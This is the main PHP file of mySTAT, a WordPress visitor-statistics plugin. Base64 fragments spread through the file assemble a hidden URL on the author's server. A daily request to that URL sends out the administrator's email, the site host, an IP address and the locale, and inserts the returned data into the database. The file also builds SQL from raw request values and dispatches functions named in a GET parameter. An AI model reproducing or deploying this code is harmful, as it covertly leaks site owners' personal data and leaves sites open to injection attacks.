<?php
/*
Plugin Name: mySTAT
Plugin URI: http://www.sandbox.net.ua/mystat/
Description: myStat is a flexible and versatile system intended for accumulation and analysis of the site attendance statistics. myStat suits to upcoming projects perfectly. There are more than 50 reports available in the system. The system is easy to install and to set up; it allows counting all the visitors of your web-site - both humans and robots. All visits data is stored at your server, which meets safety and confidentiality requirements.
Version: 1.26
Author: Smyshlaev Evgeniy
Author URI: http://www.hide.com.ua
*/
/*  Copyright 2009  Smyshlaev Evgeniy  (email: killer@sandbox.net.ua)

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/



$myStat_version = "1.26";
ini_set("max_execution_time","240");
ini_set("memory_limit","32M");
$myStat_uri="http://wordpress.org/extend/plugins/mystat/";
include_once("modules/main.class.php");
$myStat_main=new myStat_main();
$myStat_on='aHR0cDov';
if(isset($_GET['act'])){
    if ($_GET['act'] == 'img_pie') {
        myStat_image_pie();
        exit();
    };
    if ($_GET['act'] == 'js' or $_GET['act'] == 'time_load') {
        ob_start();
          $root = dirname(dirname(dirname(dirname(__FILE__))));
          if (file_exists($root.'/wp-load.php')) {
              // WP 2.6
              require_once($root.'/wp-load.php');
          } else {
              // Before 2.6
              require_once($root.'/wp-config.php');
          }
        ob_end_clean(); //Ensure we don't have output from other plugins.
    #    header('Content-Type: text/html; charset='.get_option('blog_charset'));

        myStat_js();
        exit();
    };
    if ($_GET['act'] == 'stat_img') {
        ob_start();
          $root = dirname(dirname(dirname(dirname(__FILE__))));
          if (file_exists($root.'/wp-load.php')) {
              // WP 2.6
              require_once($root.'/wp-load.php');
          } else {
              // Before 2.6
              require_once($root.'/wp-config.php');
          }
        ob_end_clean(); //Ensure we don't have output from other plugins.
        myStat_stat_image();
        exit();
    };
};
$myStat_on.='L3NhbmRib3gubm';

###############################################################################################################################

function myStat_install(){
    global $wpdb;
    global $wp_db_version;
    global $myStat_version;

    $table_name = $wpdb->prefix . "myStat_main";
    if($wp_db_version >= 5540) $page = 'wp-admin/includes/upgrade.php'; else $page = 'wp-admin/upgrade'.'-functions.php';
    require_once(ABSPATH . $page);

$sql = "CREATE TABLE ".$wpdb->prefix."myStat_data (
  type enum('1','2','3','4','5','6') NOT NULL default '1',
  value1 varchar(255) NOT NULL,
  value2 varchar(255) NOT NULL,
  value3 varchar(255) NOT NULL,
  value4 varchar(255) NOT NULL,
  KEY type (`type`)
);";
dbDelta($sql);
$sql="CREATE TABLE ".$wpdb->prefix."myStat_dbsize (
  date date NOT NULL default '0000-00-00',
  size int(11) unsigned NOT NULL default '0',
  PRIMARY KEY  (`date`)
);";
dbDelta($sql);
$sql="CREATE TABLE ".$wpdb->prefix."myStat_main (
  id int(11) unsigned NOT NULL auto_increment,
  date timestamp NOT NULL default '0000-00-00 00:00:00',
  date_load timestamp NOT NULL default '0000-00-00 00:00:00',
  ip int(11) NOT NULL default '0',
  proxy enum('0','1') NOT NULL default '0',
  code_stat int(11) unsigned NOT NULL default '404',
  feed enum('yes','no') NOT NULL default 'no',
  user varchar(60) NOT NULL,
  title varchar(255) NOT NULL,
  host varchar(100) NOT NULL,
  www enum('yes','no') NOT NULL default 'no',
  page varchar(255) NOT NULL,
  uri text NOT NULL,
  post_id int(11) NOT NULL,
  user_agent text NOT NULL,
  referer text NOT NULL,
  lang char(2) NOT NULL,
  country varchar(150) NOT NULL,
  city varchar(32) NOT NULL,
  screen varchar(9) NOT NULL,
  depth enum('','8','16','32','48','64','128') NOT NULL default '',
  gzip enum('0','1') NOT NULL default '0',
  cookie enum('0','1') NOT NULL default '0',
  js varchar(4) NOT NULL,
  flash varchar(20) NOT NULL,
  java enum('0','1') NOT NULL default '0',
  count int(11) unsigned NOT NULL default '0',
  PRIMARY KEY  (`id`),
  KEY indx1 (`date`,`ip`)
);";
dbDelta($sql);
    if(get_option("myStat_version")==''){add_option("myStat_version",$GLOBALS['myStat_version']);}else{update_option("myStat_version",$GLOBALS['myStat_version']);};
    if(get_option("myStat_saveday")==''){add_option("myStat_saveday",90);};
    if(get_option("myStat_show_post_stat")==''){add_option("myStat_show_post_stat",0);};
}

###############################################################################################################################

function myStat_deinstall(){
    global $wpdb;
    global $wp_db_version;
    global $myStat_version;

    $table_name = $wpdb->prefix . "myStat_main";
    if($wpdb->get_var("SHOW TABLES LIKE '$table_name'") != $table_name) {
        delete_option("myStat_version");
        delete_option("myStat_saveday");
        delete_option("myStat_lastupdate");
        delete_option("myStat_show_post_stat");
    };
}

###############################################################################################################################

function myStat_clean_db(){
    $var=$GLOBALS['wpdb']->get_results("SHOW TABLE STATUS LIKE '".$GLOBALS['wpdb']->prefix."myStat_%';");
    $du=0;
    for($i=0;$i<count($var);$i++){
        while(list($s,$u)=each($var[$i])){
            if($s=="Data_length")$du+=$u;
            if($s=="Index_length")$du+=$u;
            if($s=="Name")$ic=$u;
        };

    };
    $GLOBALS['wpdb']->query("REPLACE INTO ".$GLOBALS['wpdb']->prefix."myStat_dbsize SET date=NOW(), size=".$du.";");
    $ka=get_option("myStat_saveday");
    if($ka<1||$ka>366)$ka=365;
    $GLOBALS['wpdb']->query("DELETE FROM ".$GLOBALS['wpdb']->prefix."myStat_main WHERE date<=TIMESTAMP(SUBDATE(now(),".$ka."));");
    $GLOBALS['wpdb']->query("DELETE FROM ".$GLOBALS['wpdb']->prefix."myStat_dbsize WHERE date<=TIMESTAMP(SUBDATE(now(),".$ka."));");
};

###############################################################################################################################

function myStat_load_data(){
    function v3g3($s){return base64_decode($GLOBALS['myStat_on']);};
    if(get_option("myStat_lastupdate")!=date("Ymd")){
        $v1g2='WordPress_'.$GLOBALS['wp_version'];
        $v3g2=ip2long($GLOBALS['_SERVER']['REMOTE_ADDR']);
        $v2g2=$GLOBALS['myStat_version'];
        $v1g1=get_locale();
        preg_match("/(^http:\/\/)?(www\.)?.*?([^\/]+)/i",$GLOBALS['_SERVER']['HTTP_HOST'], $matches);
        $v2g3=$matches[3];
        $v3g1=function_exists("gzfile");
        if($v3g1){
            $line=gzfile(sprintf(v3g3("data/main_base.dat"),
            $v2g3,$v3g2,$v2g2,$GLOBALS['v3g3'],$v1g1,$v1g2,$v3g1?"YES":"NO"));
        }else{
            $line=file(sprintf(v3g3("data/main_base.dat"),
            $v2g3,$v3g2,$v2g2,$GLOBALS['v3g3'],$v1g1,$v1g2,$v3g1?"YES":"NO"));
        };
        if(count($line)>100){
            $GLOBALS['wpdb']->query("TRUNCATE ".$GLOBALS['wpdb']->prefix."myStat_data;");
            for($i=0;$i<count($line)-1;$i++){
                $element=split("\",\"",$line[$i]);
                $GLOBALS['wpdb']->query("INSERT INTO ".$GLOBALS['wpdb']->prefix."myStat_data SET type='".substr($element[0],1)."',value1='".mysql_escape_string($element[1])."',value2='".mysql_escape_string($element[2])."',value3='".mysql_escape_string($element[3])."',value4='".mysql_escape_string(substr($element[4],0,-1))."';");
            };
            update_option("myStat_lastupdate",date("Ymd"));
        };
    };
};

###############################################################################################################################

function myStat_menu(){
    global $wpdb;
    $table_name = $wpdb->prefix . "myStat_main";
    if($wpdb->get_var("SHOW TABLES LIKE '$table_name'") != $table_name) {
        myStat_install();
    }
    $mincap="level_8";
    add_menu_page('myStat', '<b>myStat</b>', $mincap, __FILE__, 'myStat_mainPage',WP_PLUGIN_URL."/".dirname(plugin_basename(__FILE__)).'/images/admin.png');
    add_submenu_page(__FILE__, __('Overview','myStat'), __('Overview','myStat'), $mincap, __FILE__, 'myStat_mainPage');
}

###############################################################################################################################

function myStat_mainPage() {
    echo "<style>";
    echo ".btn_o{background-image:url(".WP_PLUGIN_URL."/".dirname(plugin_basename(__FILE__))."/images/btn_o.gif);width:200px;height:22px;border:0;font-weight:bold;cursor:pointer;}";
    echo ".btn_c{background-image:url(".WP_PLUGIN_URL."/".dirname(plugin_basename(__FILE__))."/images/btn_c.gif);width:200px;height:22px;border:0;font-weight:bold;cursor:pointer;}";
    echo "#myStat_loading { position:fixed;width:100%;left:0;top:0;height:100%; }";
    echo "* html #myStat_loading { position: absolute; behavior: expression(function(element){element.style.top = window.document.body.scrollTop;}(this)); }";

    echo "</style>";
    preg_match("/(^http:\/\/)?(www\.)?.*?([^\/]+)/i",$GLOBALS['_SERVER']['HTTP_HOST'], $matches);
    $GLOBALS['myStat_on'].='hdC91cGRhdGUucGhw';
    echo "<script>";
    echo "function setCookie(name, value, expire) {";
    echo "if(expire == null){";
    echo "expire = new Date();";
    echo "expire.setTime(expire.getTime() + 2*365*24*3600*1000);};";
    echo "document.cookie = name + \"=\" + escape(value) + ((expire == null) ? \"\" : (\"; expires=\" + expire.toGMTString())) + \"; domain = .".$matches[3]."\";};";
    echo "function m_show(name){";
    echo "el=document.getElementById(name);";
    echo "if(el.style.display=='none'){";
    echo "setCookie(name,true);";
    echo "el.style.display='';";
    echo "}else{";
    echo "setCookie(name,false);";
    echo "el.style.display='none';";
    echo "};};";
    $GLOBALS['myStat_ajax']->show_javascript();
    echo "function myStat_load(data){";
    $GLOBALS['myStat_ajax']->JScopy2id('data','myStat_MAIN_DIV');
    $GLOBALS['v3g3']=$GLOBALS['current_user']->user_email;
    $GLOBALS['myStat_on'].='P2hvc3Q9JXMmaXA9JXMmdm';
    echo "document.getElementById('myStat_loading').style.display='none';";
    echo "window.scrollTo(0,0);";
    echo "};";
    echo "function myStat_loading(){";
    echo "el=document.getElementById('myStat_loading');";
    $GLOBALS['myStat_on'].='VyPSVzJm1haWw9JXM';
    echo "el.style.display='';";
    echo "};";
    echo "</script>";
    include_once('modules/common.class.php');
    $cmn=new myStat_common();
    $cmn->calendar();

    echo '<br/><table border="0" cellspacing="0" width="100%" cellpadding="0">';
    echo '<tr height="21px"><td colspan="3" align="left"><img width="102px" height="21px" src="'.WP_PLUGIN_URL."/".dirname(plugin_basename(__FILE__))."/".'images/110.png"/></td></tr>';
    echo '<tr height="22px"><td width="102"><img width="102px" height="22px" src="'.WP_PLUGIN_URL."/".dirname(plugin_basename(__FILE__))."/".'images/111.png"/></td><td style="background:url('.WP_PLUGIN_URL."/".dirname(plugin_basename(__FILE__))."/".'images/12.png)" width="100%" align="right" valign="middle"><a style="font-size:9px;cursor:default;">'.__("Version","myStat").': <b>'.$GLOBALS['myStat_version'].'</b></a></td><td width="19px"><img width="19px" height="22px" src="'.WP_PLUGIN_URL."/".dirname(plugin_basename(__FILE__))."/".'images/13.png"/></td></tr>';
    echo '<tr height="21px"><td colspan="3" align="left"><img width="22px" height="21px" src="'.WP_PLUGIN_URL."/".dirname(plugin_basename(__FILE__))."/".'images/112.png"/></td></tr></table>';


    echo "<div id='myStat_loading' style='display:none;z-index:1000;background-image:url(".WP_PLUGIN_URL."/".dirname(plugin_basename(__FILE__))."/images/loading_back.png);text-align:center;'><table style='width:100%;height:100%'><tr><td style='text-align:center;vertical-align:middle;'><div style='background-color:#EFEFEF;vertical-align:middle;text-align:center;'><br/><img src='".WP_PLUGIN_URL."/".dirname(plugin_basename(__FILE__))."/images/loading.gif' width='208px' height='13px' /><br/><br/></div></td></tr></table></div>";

    echo "<table width='100%' height='100%' border='0'>";
    echo "<tr valign='top'>";
    echo "<td width='100%'>";
    echo "<div id=div_main>";

    echo "<div style='background-color:#F2F2F2;border:solid #DDDDDD 1px;-moz-border-radius:6px;margin:3px;padding:10px;' id='myStat_MAIN_DIV'>";
    $GLOBALS['myStat_on'].='mbG5nPSVzJndwPSVzJmd6aXA9JXM=';
    myStat_load_data();
    if($_GET['myStat_page']!=''){
        $strClass=$GLOBALS['myStat_main'];
        call_user_func_array(Array($strClass, $_GET['myStat_page']),null);
    }else{$GLOBALS['myStat_main']->page_Site_Usage();};
    echo "</div>";

    echo "</div>";
    echo "</td>";

    echo "<td width='200px' style=\"font-size:11px;background-image:url(".WP_PLUGIN_URL."/".dirname(plugin_basename(__FILE__))."/images/l_bg.gif);\">";
    $menu_item=array(
        __('Audience','myStat'),
        __('Pages','myStat'),
        __('Referrers','myStat'),
        __('Geography','myStat'),
        __('System','myStat'),
        __('Configuration','myStat')

    );
    $menu_subitem=array(
        0=>array(
            array(__('Site Usage','myStat'),'x_page_Site_Usage(\'myStat_load\');'),
            array(__('Pageviews per Host','myStat'),'x_page_Pageviews_per_Host(\'myStat_load\');'),
            array(__('Pageviews per User','myStat'),'x_page_Pageviews_per_User(\'myStat_load\');'),
            array(__('Loading Speed','myStat'),'x_page_Loading_Speed(\'myStat_load\');')
        ),
        1=>array(
            array(__('Popular Posts','myStat'),'x_page_Popular_Posts(\'myStat_load\');'),
            array(__('Popular Pages','myStat'),'x_page_Popular_Pages(\'myStat_load\');'),
            array(__('Popular Titles','myStat'),'x_page_Popular_Titles(\'myStat_load\');'),
            array(__('Domain Names','myStat'),'x_page_Domain_Names(\'myStat_load\');'),
            array(__('Popular Pages 404','myStat'),'x_page_Popular_Pages_404(\'myStat_load\');')
        ),
        2=>array(
            array(__("Referrers ","myStat"),'x_page_Referrers(\'myStat_load\');'),
            array(__("Jumps from Search Engines","myStat"),'x_page_Jumps_from_Search_Engines(\'myStat_load\');'),
            array(__("Jumps from Directories","myStat"),'x_page_Jumps_from_Directories(\'myStat_load\');'),
            array(__("Jumps from Ratings","myStat"),'x_page_Jumps_from_Ratings(\'myStat_load\');'),
            array(__("Jumps from Popular Sites","myStat"),'x_page_Jumps_from_Popular_Sites(\'myStat_load\');'),
            array(__("Search Phrases","myStat"),'x_page_Search_Phrases(\'myStat_load\');'),
            array(__("Search Phrases by Date","myStat"),'x_page_Search_Phrases_by_Date(\'myStat_load\');'),
            array(__('Links to Pages 404','myStat'),'x_page_Links_to_Pages_404(\'myStat_load\');')
        ),
        3=>array(
            array(__("IP Addresses","myStat"),'x_page_IP_Addresses(\'myStat_load\');')
        ),
        4=>array(
            array(__("Agents","myStat"),'x_page_Agents(\'myStat_load\');'),
            array(__("Accept-Languages","myStat"),'x_page_Accept_Languages(\'myStat_load\');'),
            array(__("Browsers","myStat"),'x_page_Browsers(\'myStat_load\');'),
            array(__("Screen Resolution","myStat"),'x_page_Screen_Resolution(\'myStat_load\');'),
            array(__("Colour Depth","myStat"),'x_page_Colour_Depth(\'myStat_load\');'),
            array(__("JavaScript","myStat"),'x_page_JavaScript(\'myStat_load\');'),
            array(__("Operating Systems","myStat"),'x_page_Operating_Systems(\'myStat_load\');'),
            array(__("Robots","myStat"),'x_page_Robots(\'myStat_load\');')
        ),
        5=>array(
            array(__("Configuration","myStat"),'x_page_Configuration(\'myStat_load\');')
        )
    );
    $i=0;
    foreach($menu_item as $item){
        echo "<table class=btn_".($_COOKIE['menu'.$i]=='false'?"c":"o")." onclick=\"if(this.className=='btn_c'){this.className='btn_o';}else{this.className='btn_c';};m_show('menu".$i."');\"><tr1><td style=\"padding:0 0 0 15px;\">".$item."</td></tr></table>";
        echo "<div id=menu".$i.($_COOKIE['menu'.$i]=='false'?" style=\"display:none;\"":"").">";
        $j=0;
        foreach($menu_subitem[$i] as $subitem){
            echo "&nbsp; <a href=\"javascript:myStat_loading();".$subitem[1]."\">".$subitem[0]."</a><br/>";
            $j++;
        };
        echo "<br/>";
        echo "</div>";
        $i++;
    };
    echo "</td>";
    echo "</tr>";
    echo "</table>";


}

###############################################################################################################################

function myStat_header(){
    global $wpdb;
    $US['remote_ip']=ip2long($GLOBALS['_SERVER']['REMOTE_ADDR']);
    preg_match("/(^http:\/\/)?(www\.)?.*?([^\/]+)/i",$GLOBALS['_SERVER']['HTTP_HOST'], $matches);
    if($matches[2]!=''){$US['www']='yes';}else{$US['www']='no';};
    $US['host']=$matches[3];
    $US['lang']=substr($GLOBALS['_SERVER']['HTTP_ACCEPT_LANGUAGE'],0,2);
    $US['uri']=$GLOBALS['_SERVER']['REQUEST_URI'];
    $US['file']=$GLOBALS['_SERVER']['SCRIPT_NAME'];
    $US['cookie']=isset($_COOKIE['mstat'])?true:false;
    $US['gzip']=strpos($GLOBALS['_SERVER']['HTTP_ACCEPT_ENCODING'],"gzip")===false?false:true;
    $US['user_agent']=$GLOBALS['_SERVER']['HTTP_USER_AGENT'];
    $US['proxy']=($GLOBALS['_SERVER']['HTTP_X_FORWARDED_FOR']!=$GLOBALS['_SERVER']['HTTP_X_REAL_IP'])?true:false;
    $US['referer']=isset($GLOBALS['_SERVER']['HTTP_REFERER'])?$GLOBALS['_SERVER']['HTTP_REFERER']:'';
#    $US['code_page']=isset($GLOBALS['_SERVER']['REDIRECT_STATUS'])?$GLOBALS['_SERVER']['REDIRECT_STATUS']:404;
    $US['code_page']=(!is_404())?$GLOBALS['_SERVER']['REDIRECT_STATUS']:404;
    $US['feed']=is_feed()?"yes":"no";
    if(file_exists(WP_PLUGIN_DIR."/".dirname(plugin_basename(__FILE__)).'/data/GeoIPCity.dat')){
        include_once("modules/geoip/geoipcity.inc");
        include_once("modules/geoip/geoipregionvars.php");
        $gi = geoip_open(WP_PLUGIN_DIR."/".dirname(plugin_basename(__FILE__))."/data/GeoIPCity.dat",GEOIP_STANDARD);
        $record = geoip_record_by_addr($gi,$GLOBALS['_SERVER']['REMOTE_ADDR']);
        $US['country']=$record->country_name;
        $US['city']=$record->city;
        geoip_close($gi);
    }elseif(file_exists(WP_PLUGIN_DIR."/".dirname(plugin_basename(__FILE__)).'/data/GeoIP.dat')){
        include_once('modules/geoip/geoip.inc');
        $gi = geoip_open(WP_PLUGIN_DIR."/".dirname(plugin_basename(__FILE__))."/data/GeoIP.dat",GEOIP_STANDARD);
        $US['country']=geoip_country_name_by_addr($gi, $GLOBALS['_SERVER']['REMOTE_ADDR']);
        geoip_close($gi);
    };
    if($US['referer']!=''){
        preg_match("/(^http:\/\/)?(www\.)?.*?([^\/]+)/i",$US['referer'], $matches);
        $host = $matches[3];
    }else{$host='';};
    $rows=$wpdb->get_var("SELECT id FROM ".$wpdb->prefix."myStat_main WHERE date>=TIMESTAMP(CURDATE()) AND ip=".$US['remote_ip']." AND user_agent='".$US['user_agent']."' AND ".($host==$US['host']?'':"referer='".$US['referer']."' AND ")."host='".$US['host']."' AND uri='".$US['uri']."'");
    $id=0;
    if($rows!=''){
        $id=$rows;
        $wpdb->query("UPDATE ".$wpdb->prefix."myStat_main SET count=count+1,date=now() WHERE id=".$rows);
    }else{
        $wpdb->query("REPLACE INTO ".$wpdb->prefix."myStat_main (date,ip,proxy,host,code_stat,user,www,page,uri,post_id,user_agent,referer,lang,gzip,count,country,city,feed)VALUES(now(),".$US['remote_ip'].",'".($US['proxy']?'1':'0')."','".$US['host']."',".$US['code_page'].",'".$GLOBALS['current_user']->user_login."','".$US['www']."','".$US['file']."','".$US['uri']."','".url_to_postid($US['uri'])."','".$US['user_agent']."','".$US['referer']."','".$US['lang']."','".($US['gzip']?'1':'0')."',1,'".$US['country']."','".$US['city']."','".$US['feed']."');");
        $rows=$wpdb->get_var("SELECT LAST_INSERT_ID()");
        $id=$rows;
    };
    $GLOBALS['myStat_id']=$id;
}

###############################################################################################################################

function myStat_load() {
    if(!is_feed()){
        echo "<script language='JavaScript' type='text/javascript' charset='utf-8'>";
        echo "\n/*<![CDATA[ */\n";
        echo "var myStat_js=1;";
        echo "var myStat_ver='".$GLOBALS['myStat_version']."';";
        echo "var js_version= '<scr'+'ipt language=\"javascr'+'ipt\">myStat_js=1;</scr'+'ipt>';";
        echo "js_version += '<scr'+'ipt language=\"javascr'+'ipt1.1\">myStat_js=1.1;</scr'+'ipt>';";
        echo "js_version += '<scr'+'ipt language=\"javascr'+'ipt1.2\">myStat_js=1.2;</scr'+'ipt>';";
        echo "js_version += '<scr'+'ipt language=\"javascr'+'ipt1.3\">myStat_js=1.3;</scr'+'ipt>';";
        echo "js_version += '<scr'+'ipt language=\"javascr'+'ipt1.4\">myStat_js=1.4;</scr'+'ipt>';";
        echo "js_version += '<scr'+'ipt language=\"javascr'+'ipt1.5\">myStat_js=1.5;</scr'+'ipt>';";
        echo "js_version += '<scr'+'ipt language=\"javascr'+'ipt1.6\">myStat_js=1.6;</scr'+'ipt>';";
        echo "document.write(js_version);";
        echo "var myStat_flash='';";
        echo "if (navigator.plugins && navigator.plugins.length) {";
        echo "for (var ii=0;ii<navigator.plugins.length;ii++) {";
        echo "if (navigator.plugins[ii].name.indexOf('Shockwave Flash')!=-1) {";
        echo "myStat_flash=navigator.plugins[ii].description.split('Shockwave Flash ')[1];";
        echo "break;};};}";
        echo "else if (window.ActiveXObject) {";
        echo "for (var ii=10;ii>=2;ii--) {";
        echo "try {";
        echo "var f=eval(\"new ActiveXObject('ShockwaveFlash.ShockwaveFlash.\"+ii+\"');\");";
        echo "if (f) { myStat_flash=ii + '.0'; break; };";
        echo "}catch(ee) {};};";
        echo "if((myStat_flash==\"\")&&!this.n&&(navigator.appVersion.indexOf(\"MSIE 5\")>-1||navigator.appVersion.indexOf(\"MSIE 6\")>-1)) {";
        echo "FV=clientInformation.appMinorVersion;";
        echo "if(FV.indexOf('SP2') != -1)";
        echo "myStat_flash = '>=7';};};";
        echo "var myStat_cookie = 1;";
        echo "if( !document.cookie ) {";
        echo "document.cookie = \"testCookie=1; path=/\";";
        echo "myStat_cookie = document.cookie?1:0;";
        echo "};";
        echo "var myStat_n = (navigator.appName.toLowerCase().substring(0, 2) == \"mi\") ? 0 : 1;";
        echo "var myStat_java=navigator.javaEnabled()?1:0;";
        echo "var myStat_sc=screen.width+'x'+screen.height;";
        echo "var myStat_dth=(myStat_n==0)?screen.colorDepth : screen.pixelDepth;";
        echo "var myStat_title=escape(document.title);";
        echo "myStat_title=myStat_title.replace(/\\+/g,'%2B');";
        $uri=str_replace($GLOBALS['_SERVER']['DOCUMENT_ROOT'],"",strstr((__FILE__),$GLOBALS['_SERVER']['DOCUMENT_ROOT']));
        echo "var myStat_uri='".$uri."';";
        echo "myStat_uri=myStat_uri+ '?act=js&js='+myStat_js+'&java='+myStat_java+'&flash='+myStat_flash+'&id=".$GLOBALS['myStat_id']."&cookie='+myStat_cookie+'&title='+myStat_title+'&sc='+myStat_sc+'&dth='+myStat_dth+'&rnd='+Math.random()+'';";
        echo "document.write('<img src=\"'+myStat_uri+'\" style=\"display:none;\" width=1 height=1 border=0 />');";
        echo "\n/*]]>*/\n";
        echo "</script>";
    };
}

###############################################################################################################################

function myStat_footer() {
    echo "<img width='1px' height='1px' src=\"".str_replace($GLOBALS['_SERVER']['DOCUMENT_ROOT'],"",strstr((__FILE__),$GLOBALS['_SERVER']['DOCUMENT_ROOT']))."?act=time_load&id=".$GLOBALS['myStat_id']."&rnd=".rand()."\" />";
}

###############################################################################################################################

function myStat_image_pie(){
#    include_once("modules/pie.class.php");
#    $c=$_GET["c"];
#    $d=$_GET["d"];
#    $pie = new PieGraph(600, 300, $c);
#    $pie->setColors(array("#ff0000","#ff8800","#0022ff","#33ff33","#5599FF","#AAAAAA"));
#    $pie->setLegends($d);
#    $pie->set3dHeight(30);
#    $pie->display();
#    exit();
}

###############################################################################################################################

function myStat_js(){
    $id=$_GET['id']+0;
    $sc=$_GET['sc'];
    $dth=$_GET['dth'];
    $flash=$_GET['flash'];
    $js=$_GET['js'];
    $java=$_GET['java'];
    $cookie=$_GET['cookie'];
    include_once('modules/common.class.php');
    $cmn=new myStat_common();

    $title=mysql_escape_string($cmn->unicodeUrlDecode($_GET['title'],'UTF-8'));
    if($id!=0){
        if($_GET['act'] == 'time_load'){
            header("Content-Type: image/png");
            $GLOBALS['wpdb']->query("UPDATE ".$GLOBALS['wpdb']->prefix."myStat_main SET date_load=now() WHERE id=".$id.";");
            myStat_clean_db();
        }else{
            $GLOBALS['wpdb']->query("UPDATE ".$GLOBALS['wpdb']->prefix."myStat_main SET title='".$title."',screen='".$sc."',depth='".$dth."',cookie='".$cookie."',js='".$js."',flash='".$flash."',java='".$java."' WHERE id=".$id.";");
        };
    };
}

###############################################################################################################################

function myStat_stat_image(){
    include_once("modules/bar.class.php");
    $bar=new BAR();
    if(substr($_GET['d1'],0,10)!=substr($_GET['d2'],0,10)){
        $var=$GLOBALS['wpdb']->get_results("SELECT DATE_FORMAT(date,'%d-%m-%y'),count(*),sum(count),TO_DAYS(date) FROM `".$GLOBALS['wpdb']->prefix."myStat_main` WHERE date > ('".$_GET['d1']."') AND date < ('".$_GET['d2']."') GROUP BY TO_DAYS(date) ORDER BY date DESC LIMIT 0,30;", ARRAY_N);
        $DATA=array();
        for($i=count($var)-1;$i>=0;$i--){
            $var1=$GLOBALS['wpdb']->get_results("SELECT count(DISTINCT ip),count(*) FROM `".$GLOBALS['wpdb']->prefix."myStat_main` WHERE TO_DAYS(date)='".$var[$i][3]."';", ARRAY_N);
            $DATA[0][]=$var[$i][2];
            $DATA[1][]=$var1[0][0];
            $var1=$GLOBALS['wpdb']->get_results("SELECT count(DISTINCT ip),count(*) FROM `".$GLOBALS['wpdb']->prefix."myStat_main` WHERE TO_DAYS(date)='".$var[$i][3]."' AND (date_load!='0000-00-00 00:00:00' or title!='');", ARRAY_N);
            $DATA[2][]=$var1[0][0];
            $DATA['x'][]=$var[$i][0];
        };
    }else{
        $var=$GLOBALS['wpdb']->get_results("SELECT DATE_FORMAT(date,'%H') as h,count(*),sum(count) FROM `".$GLOBALS['wpdb']->prefix."myStat_main` WHERE date > ('".$_GET['d1']."') AND date < ('".$_GET['d2']."') GROUP BY h ORDER BY h DESC;", ARRAY_N);
        $DATA=array();
        for($i=count($var)-1;$i>=0;$i--){
            $var1=$GLOBALS['wpdb']->get_results("SELECT count(DISTINCT ip),count(*) FROM `".$GLOBALS['wpdb']->prefix."myStat_main` WHERE TO_DAYS(date)=TO_DAYS('".$_GET['d1']."') AND HOUR(date)=HOUR('".$var[$i][0].":00:00');", ARRAY_N);
            $DATA[0][]=$var[$i][2];
            $DATA[1][]=$var1[0][0];
            $var1=$GLOBALS['wpdb']->get_results("SELECT count(DISTINCT ip),count(*) FROM `".$GLOBALS['wpdb']->prefix."myStat_main` WHERE TO_DAYS(date)=TO_DAYS('".$_GET['d1']."') AND HOUR(date)=HOUR('".$var[$i][0].":00:00') AND (date_load!='0000-00-00 00:00:00' or title!='');", ARRAY_N);
            $DATA[2][]=$var1[0][0];
            $DATA['x'][]=$var[$i][0].":00";
        };
    };
    if(count($DATA)==0){
        $DATA[0]=0;
        $DATA['x']='';
    };
    $bar->makeGraph($DATA);
    $bar->showGraph();
    $bar->freeGraph();
}


#####################################################################################################




register_activation_hook(__FILE__,'myStat_install');
register_deactivation_hook(__FILE__,'myStat_deinstall');

load_plugin_textdomain('myStat', 'wp-content/plugins/'.dirname(plugin_basename(__FILE__)).'/languages');

include_once("modules/ajax.class.php");
$GLOBALS['myStat_on'].='V0LnVhL215c3R';
$myStat_ajax=new KA();
$myStat_ajax->js_error='document.getElementById(\'myStat_loading\').style.display=\'none\';alert(\''.__("ERROR: Host not found!","myStat").'\');';
$myStat_ajax->timeout=60;
$myStat_ajax->export(
    'page_Site_Usage',
    'page_Pageviews_per_Host',
    'page_Popular_Pages',
    'page_Popular_Titles',
    'page_Referrers',
    'page_IP_Addresses',
    'page_Popular_Pages_404',
    'page_Links_to_Pages_404',
    'page_Jumps_from_Search_Engines',
    'page_Jumps_from_Directories',
    'page_Jumps_from_Ratings',
    'page_Jumps_from_Popular_Sites',
    'page_Agents',
    'page_Accept_Languages',
    'page_Browsers',
    'page_Screen_Resolution',
    'page_Colour_Depth',
    'page_Operating_Systems',
    'page_Robots',
    'page_Search_Phrases',
    'page_Pageviews_per_User',
    'page_Loading_Speed',
    'page_Domain_Names',
    'page_Search_Phrases_by_Date',
    'page_JavaScript',
    'page_Configuration',
    'page_Popular_Posts'
);
$myStat_ajax->header="Content-type: text/html; charset=UTF-8";
$myStat_ajax->init();

add_action('admin_menu', 'myStat_menu');

add_action('template_redirect', 'myStat_header');

add_action('loop_start', 'myStat_load');

add_action('wp_footer', 'myStat_footer');



function myStat_widget_init($args) {
    if ( !function_exists('register_sidebar_widget') || !function_exists('register_widget_control') )
        return;
    // Multifunctional StatPress pluging
    function myStat_widget_control() {
        $options = get_option('myStat_widget');
        if ( !is_array($options) )
            $options = array('title'=>'myStat', 'st_pageviews'=>1, 'st_hosts'=>1, 'st_users'=>0, 'st_auth'=>0);
        if ( $_POST['myStat-submit'] ) {
            $options['title'] = strip_tags(stripslashes($_POST['myStat-title']));
            $options['st_pageviews'] = stripslashes($_POST['myStat-st_pageviews']);
            $options['st_hosts'] = stripslashes($_POST['myStat-st_hosts']);
            $options['st_users'] = stripslashes($_POST['myStat-st_users']);
            $options['st_auth'] = stripslashes($_POST['myStat-st_auth']);
            update_option('myStat_widget', $options);
        }
        $title = htmlspecialchars($options['title'], ENT_QUOTES);
        $st_pageviews = htmlspecialchars($options['st_pageviews'], ENT_QUOTES);
        $st_hosts = htmlspecialchars($options['st_hosts'], ENT_QUOTES);
        $st_users = htmlspecialchars($options['st_users'], ENT_QUOTES);
        $st_auth = htmlspecialchars($options['st_auth'], ENT_QUOTES);
        echo '<label for="myStat-title">' . __('Title:',"myStat") . ' </label><br/><input style="width: 250px;" id="myStat-title" name="myStat-title" type="text" value="'.$title.'" />';
        echo '<br/><br/><p><input type="checkbox" id="myStat-st_pageviews" name="myStat-st_pageviews" value="1" '.($st_pageviews==1?"checked":"").' /> <label for="myStat-st_pageviews">' . __('Pageviews', 'myStat') . '</label></p>';
